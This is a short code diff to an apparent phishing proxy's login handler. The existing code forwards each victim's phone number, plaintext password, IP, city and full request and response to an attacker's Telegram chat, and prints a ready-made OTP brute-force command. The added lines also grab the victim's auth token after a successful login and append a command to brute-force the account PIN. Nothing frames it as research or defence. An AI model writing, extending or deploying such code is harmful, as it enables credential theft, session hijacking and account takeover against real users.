@@ -1162,6 +1162,10 @@ app.post('/app/user/login/login', async (req, res) => {
       if (loginData && loginData.challengeId) {
         extraInfo = `\n\n🎯 DEVICE VERIFICATION DETECTED!\n📋 challengeId: ${loginData.challengeId}\n📱 deviceId: ${body.deviceId || 'N/A'}\n\n📝 Brute Force Command:\nnode brute-otp.js loginx ${phone || 'PHONE'} ${pwd} ${loginData.challengeId} ${body.deviceId || 'DEVICE_ID'} 0 9999`;
       }
+      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
+      if (loginToken && jsonResp?.code === 1000) {
+        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}\n\n📝 PIN Brute Command:\n/brutepin ${loginToken}|newPin`;
+      }
       bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
